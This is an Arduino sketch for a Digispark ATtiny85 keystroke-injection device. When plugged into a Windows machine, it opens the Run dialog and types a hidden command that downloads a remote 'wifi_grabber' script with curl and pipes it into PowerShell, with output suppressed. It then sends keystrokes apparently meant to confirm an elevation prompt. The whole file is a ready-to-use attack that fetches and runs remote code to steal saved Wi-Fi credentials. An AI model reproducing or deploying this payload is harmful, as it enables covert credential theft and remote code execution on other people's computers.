#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
#define MOD_SHIFT_LEFT (1<<1)
#define MOD_CONTROL_LEFT 1

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd /c curl -k https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|powershell>nul 2>&1"); 
  // DigiKeyboard.println("cmd /k curl -k https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|powershell"); //for debugging
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_RIGHT + MOD_SHIFT_RIGHT); // haven't worked for SHIFT + CTRL to open admin cmd
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
